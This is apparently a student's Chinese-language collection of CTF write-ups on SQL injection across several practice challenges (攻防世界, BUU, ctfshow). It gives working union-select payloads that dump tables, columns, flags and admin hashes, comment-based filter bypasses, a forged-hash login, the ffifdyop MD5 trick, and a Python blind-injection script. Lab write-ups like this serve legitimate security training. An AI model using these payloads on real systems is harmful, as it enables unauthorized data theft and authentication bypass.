# sql注入

## 攻防世界NewsCenter

访问IP一个新闻站

查看源代码没有新发现

有一个搜索框随便搜索抓包，发现search使用POST传入

![image-20240414150319111](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240414150319111.png)

注入点判断

按前面搜索的操作search就是搜索数据库内的内容，内容没有就没有回显，所以用常规的and 1=1方法是判断不出来注入点的，只有让SQL语句产生错误才行。

传入错误语句回显空白判断search为注入点

联合注入判断回显点

`1'union select 1,2,3#`

发现2,3为回显点

构造注入语句爆表 	数据库名news

`1'union select 1,2,database()#`

构造语句查看表名 	news,secret_table

`1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#`

构造语句查看字段名 	id,fl4g

`1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#`

构造语句查看字段fl4g内容

`1'union select 1,2,group_concat(fl4g) from secret_table#`

拿到flag	QCTF{sq1_inJec7ion_ezzz}

## my-first-sqli

![屏幕截图 2024-04-24 224908](C:\Users\刘春明\Pictures\Screenshots\屏幕截图 2024-04-24 224908.png)

万能账号登录 

![屏幕截图 2024-04-24 224842](C:\Users\刘春明\Pictures\Screenshots\屏幕截图 2024-04-24 224842.png)

## sqli-0x1 Writeup

访问ip发现是一个登录框结合题目判断登录框sql注入

万能账号不通过

查看源代码发现/?pls_help

![image-20240425211719106](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240425211719106.png)

访问查看源代码

![image-20240425211832006](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240425211832006.png)

`is_trying_to_hak_me`检测输入内容，判断user是否符合规则，查询数据库中有没有user

根据user取出password，使用$分割第一部分是sha256加密的密码第二部分是加密用的salt

将输入的password与salt拼接然后加密

然后比较

使用php生成密码为1，salt为1的hash

![屏幕截图 2024-04-25 214423](C:\Users\刘春明\Pictures\Screenshots\屏幕截图 2024-04-25 214423.png)

![屏幕截图 2024-04-25 214526](C:\Users\刘春明\Pictures\Screenshots\屏幕截图 2024-04-25 214526.png)

sql注入，看查询user的语句

`SELECT * FROM users WHERE username='$user'`

构造语句联合查询

![image-20240425214724659](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240425214724659.png)

将

`admin'union/**/select/**/1,'4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8$1`

输入user进行登录拿到flag

![image-20240425214923258](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240425214923258.png)

## BUU SQL COURSE 1

访问ip

![image-20240427205436282](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240427205436282.png)

通过名字得知是sql注入，寻找注入点

登录框弱口令与万能账号没用

在热点按钮处发现注入点

![image-20240427205844764](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240427205844764.png)

判断列数 `1 order by 1,2,3`列数为3时无回显为2时有回显

![image-20240427210208165](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240427210208165.png)

判断回显点位 `id=-1 union select 1,2`

![image-20240427210416620](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240427210416620.png)

构造sql注入语句

`id=-1 union select 1,database()`

![image-20240427210617642](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240427210617642.png)

`id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='news')`

![image-20240427210914407](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240427210914407.png)

`id=-1 union select 1,(select group_concat(column_name) from information_schema.column where table_schema='news' and table_name='admin')`

![image-20240427211438790](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240427211438790.png)

`id=-1 union select 1,(select group_concat(password) from admin)`

![image-20240427211615896](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240427211615896.png)

账号admin

密码90dca9d3f4e98f5f67c11660d29dddeb

登录获得flag

## web2

访问ip只有一个登录框，结合题目提示sql注入

`admin' or 1=1 union select 1,2,3;#--`

查看回显点

`admin' or 1=1 union select 1,database(),3;#-- `

查看库名

![image-20240428193641699](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240428193641699.png)

`admin' or 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='web2'),3;#--` 

查看数据表



![image-20240428193942470](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240428193942470.png)

`admin' or 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='web2' and table_name='flag'),3;#--` 

看列



![image-20240428194148057](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240428194148057.png)

`admin' or 1=1 union select 1,(select group_concat(flag) from flag),3;#--` 

![image-20240428194309229](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240428194309229.png)

## ctfshow web6

访问是登录框

万能账号不通过

![](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507225937274.png)

猜测过滤

发现过滤空格，使用 `/**/`代替

![](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507225908126.png)

登录成功

![image-20240507230139564](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507230139564.png)

查看回显点

`a'/**/union/**/select/**/1,2,3#`

![image-20240507230228021](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507230228021.png)

发现2为回显点，开始注入

`a'/**/union/**/select/**/1,database(),3#`

![image-20240507230353327](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507230353327.png)

库名为web2

`a'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web2'),3#`

![image-20240507230748543](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507230748543.png)

有两个表flag,user

查看flag表

`a'/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema='web2'/**/and/**/table_name='flag'),3#`

![image-20240507231019179](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507231019179.png)

发现flag字段

查看

`a'/**/union/**/select/**/1,(select/**/group_concat(flag)/**/from/**/flag),3#`

![image-20240507231120564](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507231120564.png)

拿到flag



## ctfshow web7

![image-20240509213530859](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240509213530859.png)

是一个文章网站，点击发现是数值型注入

`[ctf.show_web7](https://d1620f9b-ac9c-4066-b99b-58786467ebb2.challenge.ctf.show/index.php?id=2)`

`[ctf.show_web7](https://d1620f9b-ac9c-4066-b99b-58786467ebb2.challenge.ctf.show/index.php?id=1/**/and/**/1=2)`

![image-20240509213819752](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240509213819752.png)

空显示

`?id=-1/**/union/**/select/**/1,2,3#`

查看回显点



![image-20240509213945995](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240509213945995.png)

`?id=-1/**/union/**/select/**/1,database(),3#`

爆库名



![image-20240509214056555](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240509214056555.png)



`-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema="web7"),3#`

![image-20240509215001873](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240509215001873.png)

爆表名

`-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema="web7"/**/and/**/table_name="flag"),3`

![image-20240509215317902](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240509215317902.png)

`-1/**/union/**/select/**/1,(select/**/group_concat(flag)from/**/flag),3`

![image-20240509215512365](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240509215512365.png)

拿到flag

## ctfshow web8

是一个文章网站

尝试注入发现过滤and跟union

联合注入不可行

写脚本盲注

```python
import requests
url = 'https://83203fa0-bb20-45e7-9792-1b8a9165b2c4.challenge.ctf.show/index.php?id=-1/**/or/**/'
name = ''
for i in range(1, 45):
    payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'
    # payload = 'ascii(substr((group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'
    # payload = 'ascii(substr((group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'

    # payload = 'ascii(substr((group_concat(flag)from/**/flag)from/**/%d/**/for/**/1))=%d'
    count = 0
    print('第%d个字符' % i)
    for j in range(31,128):
        result = requests.get(url + payload % (i,j))
        if 'If' in result.text:
            name += chr(j)
            print('库名: %s' % name)
            break
        count += 1
        if count >= (128 - 31):
            exit()
```



![image-20240510175443251](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240510175443251.png)

库名为web8

容器过期了后面不做了，脚本写出来就好说了

## ctfshow web9

访问发现是一个登录框

尝试sql注入不行

信息收集查看robot.txt

发现index.phps

访问下载源代码

发现密码有MD5加密

查询语句中解密验证输入密码对错

![image-20240510211246203](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240510211246203.png)

密码输入ffifdyop

绕过拿到flag

![image-20240510211357100](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240510211357100.png)























